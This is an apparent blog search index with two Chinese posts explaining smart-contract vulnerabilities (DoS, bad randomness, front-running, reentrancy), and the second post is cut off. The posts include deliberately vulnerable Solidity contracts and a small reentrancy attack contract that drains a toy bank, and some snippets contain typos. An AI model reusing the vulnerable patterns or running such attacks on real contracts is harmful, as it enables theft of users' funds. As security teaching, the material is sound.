<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>智能合约漏洞介绍2</title>
      <link href="/2020/04/03/smartcontract-vulns-2/"/>
      <url>/2020/04/03/smartcontract-vulns-2/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>这篇讲述DASP TOP 10后面3类：未严格判断不安全函数调用返回值、拒绝服务、伪随机性、提前交易、时间操纵、其他未知短地址攻击</p><a id="more"></a><p><a href="https://www.dasp.co/" target="_blank" rel="noopener">DASP Top 10</a>，有个博主把这10类漏洞都大概描述了一下，写得真的是非常好，</p><p>repo大法！<a href="http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilites-review/" target="_blank" rel="noopener">以太坊智能合约安全入门了解一下（上）</a> <a href="https://rickgray.me/2018/05/26/ethereum-smart-contracts-vulnerabilities-review-part2/" target="_blank" rel="noopener">以太坊智能合约安全入门了解一下（下）</a></p><p>但是这篇文章还是偏向于代码向和实际用例，看心情翻牌讲</p><ol><li>Reentrancy - 重入</li><li>Access Control - 访问控制</li><li>Arithmetic Issues - 算术问题（整数溢出）</li><li><strong>Unchecked Return Values For Low Level Calls - 未严格判断不安全函数调用返回值</strong></li><li><strong>Denial of Service - 拒绝服务</strong></li><li><strong>Bad Randomness - 伪随机性</strong></li><li>Front Running - 提前交易</li><li>Time manipulation - 时间操纵</li><li>Short Address Attack - 短地址攻击</li><li>Unknown Unknowns - 其他未知</li></ol><h2 id="未严格判断不安全函数调用返回值"><a href="#未严格判断不安全函数调用返回值" class="headerlink" title="未严格判断不安全函数调用返回值"></a>未严格判断不安全函数调用返回值</h2><p>这个还是很好理解的，感觉没啥特别好说的，后续在对Mythril的功能测评的时候，会提到这个漏洞的！不过现在如果你去用remix啊这类编译器，还是会提示你这个问题的，所以目前来说，它对以太坊的影响应该会慢慢消失，除非你，从不看warnings…</p><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>引用DASP TOP 10的说法：</p><blockquote><p>One of the deeper features of Solidity are the low level functions <code>call()</code>, <code>callcode()</code>, <code>delegatecall()</code> and <code>send()</code>. Their behavior in accounting for errors is quite different from other Solidity functions, as they will not propagate (or bubble up) and will not lead to a total reversion of the current execution. Instead, they will return a boolean value set to <code>false</code>, and the code will continue to run. This can surprise developers and, if the return value of such low-level calls are not checked, can lead to fail-opens and other unwanted outcomes. Remember, <strong>send can fail!</strong></p><p>低级别的功能<code>call()</code>，<code>callcode()</code>，<code>delegatecall()</code>和<code>send()</code>，它们解决错误的行为与其他Solidity函数完全不同，因为它们不会传播（或冒泡），也不会导致当前执行的全部还原。相反，它们将返回设置为的布尔值<code>false</code>，并且代码将继续运行。这可能会使开发人员感到吃惊，并且，如果不检查此类低级调用的返回值，可能会导致失败打开和其他不良后果。记住，<strong>发送可能失败！</strong></p></blockquote><h3 id="实际例子"><a href="#实际例子" class="headerlink" title="实际例子"></a>实际例子</h3><ul><li><a href="https://www.kingoftheether.com/postmortem.html" target="_blank" rel="noopener">King of the Ether</a><br>(<a href="https://github.com/kieranelby/KingOfTheEtherThrone/blob/v0.4.0/contracts/KingOfTheEtherThrone.sol" target="_blank" rel="noopener">https://github.com/kieranelby/KingOfTheEtherThrone/blob/v0.4.0/contracts/KingOfTheEtherThrone.sol</a>)</li><li><a href="https://aakilfernandes.github.io/blockhashes-are-only-good-for-256-blocks" target="_blank" rel="noopener">Etherpot</a></li></ul><p>不详细说了</p><h2 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h2><h3 id="基本原理-1"><a href="#基本原理-1" class="headerlink" title="基本原理"></a>基本原理</h3><p>拒绝服务还是有点说头的，不过这篇文章已经说的非常清楚了，我在网上看了很多资料，感觉目前以太坊上拒绝服务也就是以下三种：</p><p>(转自: <a href="https://ethfans.org/posts/comprehensive-list-of-common-attacks-and-defense-part-6#1.%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%EF%BC%88DOS%EF%BC%89" target="_blank" rel="noopener">https://ethfans.org/posts/comprehensive-list-of-common-attacks-and-defense-part-6#1.%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%EF%BC%88DOS%EF%BC%89</a>)</p><p><strong>1.通过外部操纵映射或数组（Array）循环</strong> ——在我的经历中，我看过此种模式的各种形式。通常情况下，它出现在 <code>owner</code> 希望在其投资者之间分配代币的情况下，以及，在合约中可以看到类似于 <code>distribute()</code> 函数的情况下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract DistributeTokens &#123;</span><br><span class="line">    address public owner; <span class="comment">// gets set somewhere</span></span><br><span class="line">    address[] investors; <span class="comment">// array of investors</span></span><br><span class="line">    uint[] investorTokens; <span class="comment">// the amount of tokens each investor gets</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... extra functionality, including transfertoken()</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">invest</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        investors.push(msg.sender);</span><br><span class="line">        investorTokens.push(msg.value * <span class="number">5</span>); <span class="comment">// 5 times the wei sent</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">distribute</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == owner); <span class="comment">// only owner</span></span><br><span class="line">        <span class="keyword">for</span>(uint i = <span class="number">0</span>; i &lt; investors.length; i++) &#123; </span><br><span class="line">            <span class="comment">// here transferToken(to,amount) transfers "amount" of tokens to the address "to"</span></span><br><span class="line">            transferToken(investors[i],investorTokens[i]); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>请注意，此合约中的循环遍历的数组可以被人为扩充。攻击者可以创建许多用户帐户，让 <code>investor</code> 数据变得更大。原则上来说，可以让执行 for 循环所需的 Gas 超过区块 Gas 上限，这会使 <code>distribute()</code> 函数变得无法操作。</p><p><strong>2.所有者操作</strong>——另一种常见模式是所有者在合约中具有特定权限，并且必须执行一些任务才能使合约进入下一个状态。例如，ICO 合约要求所有者 <code>finalize()</code> 签订合约，然后才可以转让代币，即</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">bool public isFinalized = <span class="literal">false</span>;</span><br><span class="line">address public owner; <span class="comment">// gets set somewhere</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">finalize</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.sender == owner);</span><br><span class="line">    isFinalized == <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... extra ICO functionality</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// overloaded transfer function</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint _value</span>) <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(isFinalized);</span><br><span class="line">    <span class="keyword">super</span>.transfer(_to,_value)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这种情况下，如果权限用户丢失其私钥或变为非活动状态，则整个代币合约就变得无法操作。在这种情况下，如果 <code>owner</code> 无法调用 <code>finalize()</code> 则代币不可转让；即代币系统的全部运作都取决于一个地址。</p><p><strong>3.基于外部调用的进展状态</strong>——有时候，合约被编写成为了进入新的状态需要将 Ether 发送到某个地址，或者等待来自外部来源的某些输入。这些模式也可能导致 DOS 攻击：当外部调用失败时，或由于外部原因而被阻止时。在发送 Ether 的例子中，用户可以创建一个不接受 Ether 的合约。如果合约需要将 Ether 发送到这个地址才能进入新的状态，那么合约将永远不会达到新的状态，因为 Ether 永远不会被发送到合约。</p><h3 id="预防技术"><a href="#预防技术" class="headerlink" title="预防技术"></a>预防技术</h3><p>在第一个例子中，合约不应该遍历可以被外部用户人为操纵的数据结构。建议使用 withdrawal 模式，每个投资者都会调用取出函数独立取出代币。</p><p>在第二个例子中，改变合约的状态需要权限用户参与。在这样的例子中（只要有可能），如果 <code>owner</code> 已经瘫痪，可以使用自动防故障模式。一种解决方案是将 <code>owner</code> 设为一个多签名合约。另一种解决方案是使用一个时间锁，其中 [13]行 上的需求可以包括在基于时间的机制中，例如 <code>require(msg.sender == owner || now &gt; unlockTime)</code> ，那么在由 <code>unlockTime</code> 指定的一段时间后，任何用户都可以调用函数，完成合约。这种缓解技术也可以在第三个例子中使用。如果需要进行外部调用才能进入新状态，请考虑其可能的失败情况；并添加基于时间的状态进度，防止所需外部调用迟迟不到来。</p><p><em>注意：当然，这些建议都有中心化的替代方案，比如，可以添加 <code>maintenanceUser</code> ，它可以在有需要时出来解决基于 DOS 攻击向量的问题。通常，这类合约包含对这类权力实体的信任问题；不过这不是本节要探讨的内容</em>。</p><h3 id="实际例子-1"><a href="#实际例子-1" class="headerlink" title="实际例子"></a>实际例子</h3><h4 id="GovernMental"><a href="#GovernMental" class="headerlink" title="GovernMental"></a>GovernMental</h4><p><a href="http://governmental.github.io/GovernMental/" target="_blank" rel="noopener">GovernMental</a>是一个很久以前的庞氏骗局，积累了相当多的 Ether。实际上，它曾经积累起 1100 个以太。不幸的是，它很容易受到本节提到的 DOS 漏洞的影响。<a href="https://www.reddit.com/r/ethereum/comments/4ghzhv/governmentals_1100_eth_jackpot_payout_is_stuck/" target="_blank" rel="noopener">这篇 Reddit 帖子</a>描述了合约需要删除一个大的映射来取出以太。删除映射的 Gas 消耗量超过了当时的区块 Gas 上限，因此不可能撤回那 1100 个 Ether。合约地址为 <a href="https://etherscan.io/address/0xf45717552f12ef7cb65e95476f217ea008167ae3" target="_blank" rel="noopener"><code>0xF45717552f12Ef7cb65e95476F217Ea008167Ae3</code></a>，您可以从交易<a href="https://etherscan.io/tx/0x0d80d67202bd9cb6773df8dd2020e7190a1b0793e8ec4fc105257e8128f0506b" target="_blank" rel="noopener"><code>0x0d80d67202bd9cb6773df8dd2020e7190a1b0793e8ec4fc105257e8128f0506b</code></a>中看到，最后有人通过使用 250 万 Gas的交易取出了 1100 Ether 。</p><h2 id="伪随机性"><a href="#伪随机性" class="headerlink" title="伪随机性"></a>伪随机性</h2><p>我觉得伪随机性很好理解，本来区块链就不存在随机熵</p><p>这篇文章我觉得写的非常好，基本上涵盖了当前伪随机数产生的所有问题：<a href="https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620" target="_blank" rel="noopener"><strong>Predicting Random Numbers in Ethereum Smart Contracts</strong></a></p><p>这篇文章的研究思路如下：</p><ol><li>从etherscan.io和GitHub收集了3,649个智能合约。</li><li>然后将这些合同导入到Elasticsearch开源搜索引擎中。</li><li>使用Kibana Web UI进行丰富的搜索和过滤，发现了72种独特的PRNG实现。</li><li>根据对每份合同的人工评估，确定了43份易受伤害的合同。</li></ol><p>然后分为以下四类脆弱的随机数发生器（PRNG）：</p><ul><li>使用块变量作为熵源的PRNG</li><li>基于过去某个区块的哈希的PRNG</li><li>基于过去区块的区块哈希结合被视为私有的种子的PRNG</li><li>PRNG易于抢先</li></ul><p><strong>摘要部分该文章核心如下</strong></p><h3 id="使用块变量作为熵源的PRNG"><a href="#使用块变量作为熵源的PRNG" class="headerlink" title="使用块变量作为熵源的PRNG"></a>使用块变量作为熵源的PRNG</h3><p>这个主要是block.timestamp、block.coinbase、block.difficulty、block.gaslimit、block.number等等块变量引入的，这些变量可以被矿工操纵，所以就很不安全啊；而且这些都公开可查，同一个块内大家都能获取到这些信息，很危险的</p><h3 id="基于过去某个区块的哈希的PRNG"><a href="#基于过去某个区块的哈希的PRNG" class="headerlink" title="基于过去某个区块的哈希的PRNG"></a>基于过去某个区块的哈希的PRNG</h3><p>block.blockhash()可以用来获取区块hash值，但是它有取值范围，只能适用于已经出块的且取值范围是最新的256个块。也就是说，如果超出范围，取值均为0。因此，block.blockhash(block.number) == 0, 因为block.number此时没有出块</p><h4 id="预防技术-1"><a href="#预防技术-1" class="headerlink" title="预防技术"></a>预防技术</h4><blockquote><p>A better approach is to use the blockhash of some future block. The implementation scenario is as follows:</p><p>毅哥更好的方法是使用一些未来的区块，实现方案如下：</p><ul><li><p>The player makes a bet and the house stores the block.number of the transaction.</p><p>玩家下注，房屋将存储交易的block.number。</p></li><li><p>In a second call to the contract, the player requests that the house announces the winning number.</p><p>在第二次致电合约时，玩家要求房主宣布中奖号码。</p></li><li><p>The house retrieves the saved block.number from storage and gets its blockhash, which is then used to generate a pseudo-random number.</p><p>房子从存储中检索保存的block.number并获取其blockhash，然后将其用于生成伪随机数。</p></li></ul><p>This approach works only if an important requirement is met. The Solidity documentation warns about the limit of saved blockhashes that the EVM is able to store: The block hashes are not available for all blocks for scalability reasons. You can only access the hashes of the most recent 256 blocks, all other values will be zero.</p><p>仅当满足重要要求时，此方法才有效。Solidity文档警告了EVM可以存储的已保存块哈希的限制：block hashes出于可扩展的考虑，并不对所有区块有效，你仅能获取最新的256个区块的hash值，其他区块hash值返回为0。</p></blockquote><h3 id="基于过去区块的区块哈希结合被视为私有的种子的PRNG"><a href="#基于过去区块的区块哈希结合被视为私有的种子的PRNG" class="headerlink" title="基于过去区块的区块哈希结合被视为私有的种子的PRNG"></a>基于过去区块的区块哈希结合被视为私有的种子的PRNG</h3><p>这个玩法不行，因为区块链没有真正意义上的私有变量，实际都可查。。。</p><h3 id="PRNG易于抢先"><a href="#PRNG易于抢先" class="headerlink" title="PRNG易于抢先"></a>PRNG易于抢先</h3><p>这个应该也可以算作前置交易漏洞，以太坊的打包政策是，给的gas price高的优先，这就很有操作空间了</p><h4 id="实际例子-2"><a href="#实际例子-2" class="headerlink" title="实际例子"></a>实际例子</h4><blockquote><p>Consider the following example. A lottery uses an external oracle to get pseudo-random numbers, which are used to determine the winner from among the players who submitted their bets in each round. These numbers are sent unencrypted. An attacker may observe the pool of pending transactions and wait for the number from the oracle. As soon as the oracle’s transaction appears in the transaction pool, an attacker sends a bet with a higher gas price. The attacker’s transaction was made last in the round, but thanks to the higher gas price, is actually executed before the oracle’s transaction, making the attacker victorious. Such a task was featured in the <a href="https://blog.positive.com/zeronights-ico-hacking-contest-writeup-63afb996f1e3" target="_blank" rel="noopener">ZeroNights ICO Hacking Contest</a>.</p></blockquote><p>考虑以下示例。彩票使用外部预言机来获取伪随机数，该伪随机数用于在每个回合中提交赌注的玩家中确定赢家。这些数字未加密发送。攻击者可能会观察等待交易事务池，并等待来自oracle的数字。一旦oracle的交易出现在交易池中，攻击者便以更高的汽油价格发送赌注。由于汽油价格上涨，攻击者的交易虽然提交的晚，但是确可以在oracle的交易之前执行的，这使攻击者取得了胜利。在<a href="https://blog.positive.com/zeronights-ico-hacking-contest-writeup-63afb996f1e3" target="_blank" rel="noopener">ZeroNights ICO黑客大赛</a>中就有这样一个赌注。</p><blockquote><p>Another example of a contract prone to front-running is the game called “<a href="https://etherscan.io/address/0x5d9b8fa00c16bcafae47deed872e919c8f6535bf" target="_blank" rel="noopener">Last is me!</a>”. Every time a player buys a ticket, that player claims the last seat and the timer starts counting down. If nobody buys the ticket within a certain number of blocks, the last player to “take a seat” wins the jackpot. When the round is about to finish, an attacker may observe the transaction pool for other contestants’ transactions and claim the jackpot by means of a higher gas price.</p></blockquote><p>容易发生抢占先机的另一个例子是名为“<a href="https://etherscan.io/address/0x5d9b8fa00c16bcafae47deed872e919c8f6535bf" target="_blank" rel="noopener">Last is me！Last</a> ”的游戏。玩家每次购买彩票时，该玩家将获得最后一个席位，计时器开始倒计时。如果没有人在一定数量的区块内购买彩票，则最后一个“坐下来”的玩家将赢得大奖。当该回合即将结束时，攻击者可能会观察其他参赛者的交易的交易池，并通过更高的汽油价格索取大奖。</p><h3 id="更好的随机数生成办法"><a href="#更好的随机数生成办法" class="headerlink" title="更好的随机数生成办法"></a>更好的随机数生成办法</h3><p>文章共提到了三种：Oracle or BTCReply\Signidice\Commit–reveal</p><h4 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h4><p>就是外部预言机，老铁用图解释的很清楚</p><p><img src="https://i.loli.net/2020/04/20/vKRM7dZBpP2lDuO.png" alt="外部预言机流程"></p><p>其中红色的就是链上的内容，Oraclize daemon和random.org则是链下内容，而且不可控，所以说除非你完全信任两者，不然这也是有风险的。</p><h4 id="BTCReply"><a href="#BTCReply" class="headerlink" title="BTCReply"></a>BTCReply</h4><p>其实BTCReply就是把以太坊的矿工风险转移到了比特币矿工风险。<a href="http://btcrelay.org/" target="_blank" rel="noopener">BTCRelay</a>是以太坊和比特币区块链之间的桥梁。使用BTCRelay，以太坊区块链中的智能合约可以请求将来的比特币区块哈希并将其用作熵的来源。将BTCRelay用作PRNG的一个项目是<a href="https://etherscan.io/address/0x302fE87B56330BE266599FAB2A54747299B5aC5B" target="_blank" rel="noopener">以太坊彩票</a>。</p><p>感觉只是提高了作弊代价阈值吧</p><h4 id="Signidice"><a href="#Signidice" class="headerlink" title="Signidice"></a>Signidice</h4><p>感觉<a href="https://github.com/gluk256/misc/blob/master/rng4ethereum/signidice.md" target="_blank" rel="noopener">Signidice</a>就是利用算法签名来锁定下注者，也就是一旦出现下注者，就利用赌注所有者的私钥加签名锁定这个下注，然后合约用公钥解签来验证。摘录一下完整流程</p><blockquote><p>该算法适用于那些基于以太坊的游戏，其中玩家的每一轮结果仅取决于RNG和（可选）玩家选择的数字，而不取决于其他玩家的动作。例如，它可能适用于轮盘赌，角子机等，但不适用于那些结果取决于其他玩家或仅取决于其人数的游戏（例如彩票业）。例如，轮盘游戏可以建模为多个回合，其中单个玩家与赌场对战。在这种情况下，可以使用以下算法生成伪随机数。</p><p>​ 1. 赌场为确定性签名算法（例如RSA）生成一对新的私钥/公钥（PrivKey和PubKey）。</p><p>​ 2. 赌场创建一个智能合约，其中包含公钥（PubKey），最大参与者数和以太坊赏金。（可选：赌场更改现有智能合约的PubKey）。</p><p>​ 3. 玩家选择要下注的数字（B）和某种格式（例如20字节）的随机数（R）。如果游戏规则允许，则玩家甚至可以指定数字B的范围（奇数与偶数等）。</p><p>​ 4. 玩家发送包含以太币投注以及数据B和R的交易（TX）。</p><p>​ 5. 合同检查数字B和R的有效性和格式。无效的TX被拒绝。</p><p>​ 6. 此外，合同还会检查该球员在之前的回合中是否已经使用过数字R，在这种情况下，TX被拒绝。（如果合同被重复用于多轮游戏，则此步骤是必需的）。</p><p>​ 7. 合同将随机数R与玩家的以太帐户的公共地址（A）串联在一起，从该地址发送TX：V = A +R。结果值V存储在合同中。V的大小始终相同：size（V）= size（A）+ size（R）。在这一点上，回合的结果（胜利或失败）成为确定性的。</p><p>​ 8. 娱乐场必须使用其PrivKey对结果值V进行签名，从而产生数字签名S = sign（PrivKey，V），并发送包含S的相应TX。</p><p>​ 9. 合同从数字签名S中恢复实际的公钥（K），并验证它是否等于先前发布的PubKey（K == PubKey）。如果APK与PubKey不匹配，或者娱乐场未能在预定义的时间范围内执行步骤8，则等同于作弊。在这种情况下，合同会将奖金和原始赌注一起发送给玩家，然后通过自杀关闭合同。（在多人游戏的情况下，所有玩家共享赏金）。</p><p>​ 10. 合同使用S作为预定义PRNG算法（例如，基于SHA-3）的种子，该算法会生成幸运数字（L），例如介于0到36之间。</p><p>​ 11. 如果B对应于L，则玩家获胜，否则赌场获胜。合同将赌注发送给获胜者。</p><p>​ 12. 现在，赌场可能会关闭合同并收回赏金，或启动新一轮游戏。或者，可以将合同编程为自动进行下一轮，除非赌场将其关闭。</p><p>赌场选择了PrivKey之后，其操作将变为确定性的。玩家无法预测数字签名的结果，因此，他对随机数R的选择只能以与在现实生活中掷骰子相同的方式影响结果（因此该算法的名称）。因此，没有一个参与者可以任何有意义的方式操纵结果。</p></blockquote><p>需要注意的是，ECDSA算法不适合该算法，因为</p><blockquote><p>A [proof-of-concept](<a href="https://github.com/pertsev/web3_utilz/tree/master/ECDSA" target="_blank" rel="noopener">https://github.com/pertsev/web3_utilz/tree/master/ECDSA</a> signature generating (cheating)) of such cheating has been created by Alexey Pertsev.</p><p>Fortunately, with release of the Metropolis hardfork, a <a href="https://github.com/ethereum/EIPs/pull/198" target="_blank" rel="noopener">modular exponentiation operator</a> has been introduced. This allows implementing RSA signature verification, which unlike ECDSA does not allow manipulating input parameters to find a suitable signature.</p></blockquote><h4 id="commit-reveal"><a href="#commit-reveal" class="headerlink" title="commit-reveal"></a>commit-reveal</h4><p>所谓的提交-披露方法就是：</p><ul><li>“提交”阶段，当事双方将其受密码保护的机密提交给智能合约。</li><li>在“公开”阶段，当当事方宣布明文种子时，智能合约会验证它们是否正确，然后使用种子生成一个随机数。</li></ul><p>举个例子，所有者提供一个随机数seed1，玩家提供一个随机数seed2，但是在『提交』阶段，仅透露sha3(seed1)和sha3(seed2)的值，到公开阶段，双方再披露seed1和seed2的值，然后验证两者，最后生成一个随机数sha3(seed1, seed3, blockhash)，其中blockhash是未来区块hash值。</p><p>这个方法有个弊端就是，所有者也可以是玩家哦~所以，玩家无法信任所有者</p><p>文章有提到说<a href="https://github.com/randao/randao" target="_blank" rel="noopener">Randao</a>。该PRNG从多个方收集哈希种子，并向每个参与方奖励。没有人知道其他人的种子，因此结果确实是随机的。但是，单方拒绝透露种子将导致拒绝服务。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>所以这么看来，世上难得两全法啊~每个方法都有优势和弊端</p><p>区块链的熵源有限。设计PRNG时，开发人员应确保首先了解各方的动机，然后再选择适当的方法。</p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SmartContract </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>智能合约漏洞介绍1</title>
      <link href="/2020/04/02/smartcontract-vulns-1/"/>
      <url>/2020/04/02/smartcontract-vulns-1/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>这篇讲述重入漏洞、整数溢出漏洞、访问控制</p><a id="more"></a><p><a href="https://www.dasp.co/" target="_blank" rel="noopener">DASP Top 10</a>，有个博主把这10类漏洞都大概描述了一下，写得真的是非常好，</p><p>repo大法！<a href="http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilites-review/" target="_blank" rel="noopener">以太坊智能合约安全入门了解一下（上）</a> <a href="https://rickgray.me/2018/05/26/ethereum-smart-contracts-vulnerabilities-review-part2/" target="_blank" rel="noopener">以太坊智能合约安全入门了解一下（下）</a></p><p>但是这篇文章还是偏向于代码向和实际用例，看心情翻牌讲</p><ol><li><p><strong>Reentrancy - 重入</strong></p></li><li><p><strong>Access Control - 访问控制</strong></p></li><li><p><strong>Arithmetic Issues - 算术问题（整数溢出）</strong></p></li><li><p>Unchecked Return Values For Low Level Calls - 未严格判断不安全函数调用返回值</p></li><li><p>Denial of Service - 拒绝服务</p></li><li><p>Bad Randomness - 伪随机性</p></li><li><p>Front Running - 提前交易</p></li><li><p>Time manipulation - 时间操纵</p></li><li><p>Short Address Attack - 短地址攻击</p></li><li><p>Unknown Unknowns - 其他未知</p></li></ol><h2 id="重入攻击"><a href="#重入攻击" class="headerlink" title="重入攻击"></a>重入攻击</h2><p>solidity一大特性是可以调用外部其他合约，但在将eth发送给外部地址或者调用外部合约的时候， 需要合约提交外部调用。如果外部地址是恶意合约，攻击者可以在Fallback函数中加入恶意代码，当发生转账的时候，就会调用Fallback函数执行恶意代码，恶意代码会执行调用合约的有漏洞函数，导致转账重新提交。最严重的重入攻击发生在以太坊早期，即知名的DAO漏洞。</p><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>其实很简单，也有很多文章分析过了，比如这里是一个bank系统</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract BANK &#123;</span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public userBalances;</span><br><span class="line"><span class="comment">//存钱</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">deposit</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        userBalances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//取钱</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span> (<span class="params">uint256 _money</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(userBalances[msg.sender] &gt;= _money);</span><br><span class="line">        <span class="built_in">require</span>(msg.sender.call.value(_money)());</span><br><span class="line">        userBalances[msg.sender] -= _money;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">//查看余额</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">address _addr</span>) <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> userBalances[_addr];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在我是一个黑心黑心的存款人，我创造了一个邪恶的contract：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">contract DemonMonkey &#123;</span><br><span class="line">  uint attackVec;</span><br><span class="line">  BANK bank;</span><br><span class="line">  <span class="keyword">constructor</span>(address _addr)&#123;</span><br><span class="line">    bank = BANK(_addr);</span><br><span class="line">    attackVec = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">deposit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    bank.depost.value(<span class="number">10</span> ether)();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(attackVec &gt; <span class="number">0</span>)&#123;</span><br><span class="line">      attackVec --;</span><br><span class="line">      bank.withdraw(<span class="number">10</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">startAttack</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    bank.withdraw(<span class="number">10</span> ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键在于，取钱函数，第4行和第5行本来应该一起做完的，但是我的DemonMonkey合约fallback函数，中断了这两步骤的连续性；</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//取钱</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span> (<span class="params">uint256 _money</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(userBalances[msg.sender] &gt;= _money);</span><br><span class="line">        <span class="built_in">require</span>(msg.sender.call.value(_money)());</span><br><span class="line">        userBalances[msg.sender] -= _weiToWithdraw;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>整个调用过程，可以看见我10eth换了30eth，有点划得来啊；(<strong>ps：因为下溢出我也成了暴发户；失败 != 真失败</strong>)</p><p><img src="https://i.loli.net/2020/04/02/EvoJmVO9xHRdFw6.png" alt="调用过程图例"></p><h3 id="重入解决办法"><a href="#重入解决办法" class="headerlink" 